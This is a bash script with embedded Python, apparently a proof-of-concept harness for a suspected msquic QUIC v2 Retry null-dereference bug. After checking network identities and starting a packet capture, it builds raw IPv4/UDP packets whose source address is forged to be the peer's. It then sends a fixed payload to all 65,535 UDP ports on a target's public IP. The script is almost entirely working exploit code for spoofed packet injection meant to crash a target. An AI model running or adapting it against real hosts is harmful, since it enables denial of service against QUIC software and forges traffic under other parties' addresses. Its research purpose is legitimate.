#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-public-peer-results/attacker"
mkdir -p "$RESULTS"
python3 "$ROOT/nettest-coord.py" wait "peer-mapping.json" "$RESULTS/mapping.json" 300
ATTACKER_PUBLIC_IP="$(curl -4 -fsS https://api.ipify.org)"
PEER_IP="$(jq -r .peer_ip "$RESULTS/mapping.json")"
CLIENT_PUBLIC_IP="$(jq -r .client_public_ip "$RESULTS/mapping.json")"
PEER_PORT="$(jq -r .peer_port "$RESULTS/mapping.json")"
printf 'ATTACKER_PUBLIC_IP=%s\nPEER_IP=%s\nCLIENT_PUBLIC_IP=%s\nDESTINATION_PORT_RANGE=1-65535\nPEER_PORT=%s\n' \
  "$ATTACKER_PUBLIC_IP" "$PEER_IP" "$CLIENT_PUBLIC_IP" "$PEER_PORT" | tee "$RESULTS/network-identities.txt"
if [ "$ATTACKER_PUBLIC_IP" = "$CLIENT_PUBLIC_IP" ] || [ "$ATTACKER_PUBLIC_IP" = "$PEER_IP" ]; then
  echo "FAIL: attacker and target/peer are not distinct public IP endpoints"
  exit 1
fi
if [ "$ATTACKER_PUBLIC_IP" = "127.0.0.1" ] || [ "$CLIENT_PUBLIC_IP" = "127.0.0.1" ]; then
  echo "FAIL: a public Internet address was not identified"
  exit 1
fi

sudo tcpdump -U -ni any "udp and dst host $CLIENT_PUBLIC_IP" \
  -w "$RESULTS/attacker-egress.pcap" >/dev/null 2>&1 &
CAP_PID=$!
cleanup(){ set +e; sudo kill "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; }
trap cleanup EXIT
sleep 1

sudo python3 - "$RESULTS/mapping.json" <<'PY' | tee "$RESULTS/attacker.log"
import ipaddress,json,socket,struct,sys,time
m=json.load(open(sys.argv[1]))
src=ipaddress.IPv4Address(m["peer_ip"]).packed
dst=ipaddress.IPv4Address(m["client_public_ip"]).packed
sport=int(m["peer_port"])
payload=bytes.fromhex("806b3343cf0000")
sent=0
start=time.monotonic()
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
for dport in range(1,65536):
    udp=struct.pack("!HHHH",sport,dport,8+len(payload),0)+payload
    total_len=20+len(udp)
    ident=dport & 0xffff
    header=struct.pack("!BBHHHBBH4s4s",0x45,0,total_len,ident,0,64,17,0,src,dst)
    def checksum(data):
        if len(data)&1: data += bytes([0])
        total=sum(struct.unpack("!%dH"%(len(data)//2),data))
        while total>>16: total=(total&0xffff)+(total>>16)
        return (~total)&0xffff
    header=header[:10]+struct.pack("!H",checksum(header))+header[12:]
    packet=header+udp
    n=s.sendto(packet,(m["client_public_ip"],0))
    if n!=len(packet): raise SystemExit(f"short raw send to UDP port {dport}: {n}/{len(packet)}")
    sent+=1
s.close()
elapsed=time.monotonic()-start
print(f"SPOOF_SWEEP_SENT total={sent} src={m['peer_ip']}:{sport} dst={m['client_public_ip']}:1-65535 payload={payload.hex()} elapsed_seconds={elapsed:.3f}")
PY
sleep 2
cleanup
trap - EXIT
sudo tcpdump -nn -r "$RESULTS/attacker-egress.pcap" -c 12 >"$RESULTS/attacker-egress.txt" 2>&1 || true
cat "$RESULTS/attacker.log" "$RESULTS/attacker-egress.txt"
